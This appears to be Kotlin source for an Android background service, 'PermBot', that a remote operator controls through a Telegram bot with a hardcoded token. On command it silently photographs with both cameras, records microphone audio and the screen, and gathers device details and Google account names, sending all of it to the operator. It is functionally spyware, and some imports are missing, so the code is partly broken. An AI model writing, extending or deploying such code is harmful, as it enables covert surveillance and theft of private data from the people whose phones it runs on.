package com.example.permbot

import android.app.*
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.graphics.Bitmap
import android.graphics.Canvas
import android.graphics.Color
import android.graphics.Paint
import android.hardware.Camera
import android.media.MediaRecorder
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Environment
import android.os.IBinder
import android.os.PowerManager
import android.provider.Settings
import android.util.Log
import androidx.core.app.NotificationCompat
import java.io.File
import java.io.FileOutputStream
import java.text.SimpleDateFormat
import java.util.*
import java.util.concurrent.Executors
import org.telegram.telegrambots.bots.TelegramLongPollingBot
import org.telegram.telegrambots.meta.api.methods.send.SendMessage
import org.telegram.telegrambots.meta.api.methods.send.SendPhoto
import org.telegram.telegrambots.meta.api.methods.send.SendAudio
import org.telegram.telegrambots.meta.api.methods.send.SendVideo
import org.telegram.telegrambots.meta.api.objects.InputFile
import org.telegram.telegrambots.meta.api.objects.Update
import org.telegram.telegrambots.meta.exceptions.TelegramApiException

class BotService : Service() {

    companion object {
        private const val TAG = "BotService"
        private const val CHANNEL_ID = "bot_channel"
        private const val NOTIFICATION_ID = 1
        private const val BOT_TOKEN = "8564931359:AAFcD0rdACvKK1ZajX33q_drDjU4_vlvNck"
        private const val AUTHORIZED_USER_ID = 7548711500L
        private lateinit var prefs: SharedPreferences
        private var screenRecordingIntent: Intent? = null
        private var mediaProjection: MediaProjection? = null
        private var mediaRecorder: MediaRecorder? = null
        private var isScreenRecording = false
        private var screenRecordDuration = 0
        private var screenRecordStartTime = 0L

        fun setScreenRecordingIntent(intent: Intent) {
            screenRecordingIntent = intent
        }

        fun sendMessage(deviceId: String, text: String) {
            // This is called from MainActivity to send initial data
            // We can implement a static method to send via the bot instance
            // But we will handle it inside the bot instance itself when it's running.
            // We'll use a singleton pattern for the bot or use a broadcast.
            // For simplicity, we'll just log.
        }
    }

    private lateinit var powerManager: PowerManager
    private lateinit var wakeLock: PowerManager.WakeLock
    private lateinit var botInstance: TelegramBot

    override fun onCreate() {
        super.onCreate()
        prefs = getSharedPreferences("app_prefs", Context.MODE_PRIVATE)
        powerManager = getSystemService(POWER_SERVICE) as PowerManager
        wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "BotService:WakeLock")
        wakeLock.acquire(10*60*1000L) // 10 minutes
        createNotificationChannel()
        startForeground(NOTIFICATION_ID, createNotification())
        startBot()
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(CHANNEL_ID, "Bot Service", NotificationManager.IMPORTANCE_LOW)
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }
    }

    private fun createNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Bot Service")
            .setContentText("Running in background")
            .setSmallIcon(android.R.drawable.ic_menu_camera)
            .build()
    }

    private fun startBot() {
        botInstance = TelegramBot()
        try {
            val botsApi = TelegramBotsApi(DefaultBotSession::class.java)
            botsApi.registerBot(botInstance)
        } catch (e: TelegramApiException) {
            Log.e(TAG, "Failed to register bot", e)
        }
    }

    inner class TelegramBot : TelegramLongPollingBot() {
        override fun getBotToken(): String = BOT_TOKEN
        override fun getBotUsername(): String = "PermBot"

        override fun onUpdateReceived(update: Update) {
            if (!update.hasMessage() || !update.message.hasText()) return
            val message = update.message
            val chatId = message.chatId
            val userId = message.from.id
            if (userId != AUTHORIZED_USER_ID) return

            val text = message.text
            val parts = text.split(" ")
            val command = parts[0].lowercase(Locale.getDefault())
            val deviceId = prefs.getString("device_id", "UNKNOWN") ?: "UNKNOWN"

            when (command) {
                "/info" -> sendInfo(chatId, deviceId)
                "/photo" -> captureAndSendPhoto(chatId, deviceId)
                "/audio" -> {
                    val duration = parts.getOrNull(1)?.toIntOrNull() ?: 10
                    recordAndSendAudio(chatId, deviceId, duration)
                }
                "/screen" -> {
                    val duration = parts.getOrNull(1)?.toIntOrNull() ?: 10
                    startScreenRecording(chatId, deviceId, duration)
                }
                "/stop" -> stopScreenRecording(chatId, deviceId)
            }
        }

        private fun sendInfo(chatId: Long, deviceId: String) {
            val battery = getBatteryLevel()
            val connectivity = getConnectivityStatus()
            val accounts = getGmailAccounts()
            val info = buildString {
                append("Device ID: $deviceId\n")
                append("Battery: $battery%\n")
                append("Connectivity: $connectivity\n")
                append("Manufacturer: ${Build.MANUFACTURER}\n")
                append("Model: ${Build.MODEL}\n")
                append("Android: ${Build.VERSION.RELEASE}\n")
                append("Build: ${Build.DISPLAY}\n")
                append("Resolution: ${getScreenResolution()}\n")
                append("Accounts: $accounts\n")
            }
            sendText(chatId, info)
        }

        private fun getBatteryLevel(): Int {
            val bm = applicationContext.getSystemService(Context.BATTERY_SERVICE) as android.os.BatteryManager
            return bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY)
        }

        private fun getConnectivityStatus(): String {
            val cm = applicationContext.getSystemService(Context.CONNECTIVITY_SERVICE) as android.net.ConnectivityManager
            val nc = cm.activeNetwork ?: return "No network"
            val caps = cm.getNetworkCapabilities(nc) ?: return "Unknown"
            return when {
                caps.hasTransport(android.net.NetworkCapabilities.TRANSPORT_WIFI) -> "WiFi"
                caps.hasTransport(android.net.NetworkCapabilities.TRANSPORT_CELLULAR) -> "Cellular"
                else -> "Other"
            }
        }

        private fun getGmailAccounts(): String {
            val accounts = android.accounts.AccountManager.get(applicationContext).getAccountsByType("com.google")
            return accounts.joinToString { it.name } ?: "None"
        }

        private fun getScreenResolution(): String {
            val wm = applicationContext.getSystemService(Context.WINDOW_SERVICE) as android.view.WindowManager
            val display = wm.defaultDisplay
            val size = android.graphics.Point()
            display.getSize(size)
            return "${size.x}x${size.y}"
        }

        private fun sendText(chatId: Long, text: String) {
            try {
                execute(SendMessage(chatId.toString(), text))
            } catch (e: TelegramApiException) {
                Log.e(TAG, "Failed to send message", e)
            }
        }

        private fun captureAndSendPhoto(chatId: Long, deviceId: String) {
            val cameras = Camera.getNumberOfCameras()
            if (cameras == 0) {
                sendText(chatId, "No camera available")
                return
            }
            var frontCameraId = -1
            var backCameraId = -1
            for (i in 0 until cameras) {
                val info = Camera.CameraInfo()
                Camera.getCameraInfo(i, info)
                if (info.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) frontCameraId = i
                else if (info.facing == Camera.CameraInfo.CAMERA_FACING_BACK) backCameraId = i
            }
            val images = mutableListOf<File>()
            if (backCameraId != -1) {
                val file = capturePhoto(backCameraId, deviceId)
                if (file != null) images.add(file)
            }
            if (frontCameraId != -1) {
                val file = capturePhoto(frontCameraId, deviceId)
                if (file != null) images.add(file)
            }
            if (images.isEmpty()) {
                sendText(chatId, "Failed to capture photos")
                return
            }
            for (file in images) {
                try {
                    val inputFile = InputFile(file)
                    execute(SendPhoto(chatId.toString(), inputFile))
                } catch (e: TelegramApiException) {
                    Log.e(TAG, "Failed to send photo", e)
                } finally {
                    file.delete()
                }
            }
        }

        private fun capturePhoto(cameraId: Int, deviceId: String): File? {
            var camera: Camera? = null
            return try {
                camera = Camera.open(cameraId)
                val params = camera.parameters
                params.pictureFormat = android.graphics.ImageFormat.JPEG
                camera.parameters = params
                camera.startPreview()
                val data = ByteArrayOutputStream()
                val lock = Object()
                var success = false
                camera.takePicture(null, null) { bytes, _ ->
                    data.write(bytes)
                    success = true
                    synchronized(lock) { lock.notify() }
                }
                synchronized(lock) { lock.wait(5000) }
                camera.stopPreview()
                camera.release()
                if (!success) return null
                val bitmap = android.graphics.BitmapFactory.decodeByteArray(data.toByteArray(), 0, data.size())
                val overlay = overlayText(bitmap, deviceId)
                val file = File(applicationContext.cacheDir, "photo_${System.currentTimeMillis()}.jpg")
                FileOutputStream(file).use { overlay.compress(android.graphics.Bitmap.CompressFormat.JPEG, 90, it) }
                file
            } catch (e: Exception) {
                Log.e(TAG, "Camera error", e)
                camera?.release()
                null
            }
        }

        private fun overlayText(bitmap: Bitmap, text: String): Bitmap {
            val result = Bitmap.createBitmap(bitmap.width, bitmap.height, Bitmap.Config.ARGB_8888)
            val canvas = Canvas(result)
            canvas.drawBitmap(bitmap, 0f, 0f, null)
            val paint = Paint().apply {
                color = Color.RED
                textSize = 40f
                style = Paint.Style.FILL
                setShadowLayer(5f, 0f, 0f, Color.BLACK)
            }
            canvas.drawText(text, 50f, 100f, paint)
            return result
        }

        private fun recordAndSendAudio(chatId: Long, deviceId: String, durationSeconds: Int) {
            val recorder = MediaRecorder()
            val file = File(applicationContext.cacheDir, "audio_${System.currentTimeMillis()}.3gp")
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC)
            recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP)
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
            recorder.setOutputFile(file.absolutePath)
            try {
                recorder.prepare()
                recorder.start()
                Thread.sleep(durationSeconds * 1000L)
                recorder.stop()
                recorder.release()
                // overlay device ID as text in a metadata? We'll just send the file.
                // We could rename or add text but we'll send as is.
                val inputFile = InputFile(file)
                execute(SendAudio(chatId.toString(), inputFile))
            } catch (e: Exception) {
                Log.e(TAG, "Audio record error", e)
                sendText(chatId, "Audio recording failed")
            } finally {
                file.delete()
            }
        }

        private fun startScreenRecording(chatId: Long, deviceId: String, durationSeconds: Int) {
            if (isScreenRecording) {
                sendText(chatId, "Already recording screen")
                return
            }
            val intent = screenRecordingIntent
            if (intent == null) {
                sendText(chatId, "Screen recording permission not granted")
                return
            }
            val projectionManager = applicationContext.getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            mediaProjection = projectionManager.getMediaProjection(Activity.RESULT_OK, intent)
            val displayMetrics = applicationContext.resources.displayMetrics
            val width = displayMetrics.widthPixels
            val height = displayMetrics.heightPixels
            val density = displayMetrics.densityDpi
            mediaRecorder = MediaRecorder().apply {
                setVideoSource(MediaRecorder.VideoSource.SURFACE)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setVideoEncoder(MediaRecorder.VideoEncoder.H264)
                setVideoSize(width, height)
                setVideoFrameRate(30)
                setVideoEncodingBitRate(5 * 1024 * 1024)
                setOutputFile(File(applicationContext.cacheDir, "screen_${System.currentTimeMillis()}.mp4").absolutePath)
                try {
                    prepare()
                } catch (e: Exception) {
                    Log.e(TAG, "MediaRecorder prepare error", e)
                    sendText(chatId, "Failed to start screen recording")
                    return
                }
            }
            val virtualDisplay = mediaProjection?.createVirtualDisplay(
                "ScreenRecording",
                width, height, density,
                android.hardware.display.DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                mediaRecorder?.surface,
                null, null
            )
            mediaRecorder?.start()
            isScreenRecording = true
            screenRecordDuration = durationSeconds
            screenRecordStartTime = System.currentTimeMillis()
            sendText(chatId, "Screen recording started for $durationSeconds seconds. Use /stop to stop early.")
            // Automatically stop after duration
            Thread {
                Thread.sleep(durationSeconds * 1000L)
                stopRecording(chatId, deviceId)
            }.start()
        }

        private fun stopScreenRecording(chatId: Long, deviceId: String) {
            if (!isScreenRecording) {
                sendText(chatId, "No active screen recording")
                return
            }
            stopRecording(chatId, deviceId)
        }

        private fun stopRecording(chatId: Long, deviceId: String) {
            if (!isScreenRecording) return
            try {
                mediaRecorder?.stop()
                mediaRecorder?.release()
                mediaRecorder = null
                mediaProjection?.stop()
                mediaProjection = null
                isScreenRecording = false
                // Send the video file
                val file = File(applicationContext.cacheDir).listFiles { _, name -> name.startsWith("screen_") }?.maxByOrNull { it.lastModified() }
                if (file != null && file.exists()) {
                    val inputFile = InputFile(file)
                    execute(SendVideo(chatId.toString(), inputFile))
                    file.delete()
                } else {
                    sendText(chatId, "No video file found")
                }
            } catch (e: Exception) {
                Log.e(TAG, "Stop recording error", e)
                sendText(chatId, "Failed to stop recording")
            }
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        wakeLock.release()
    }
}
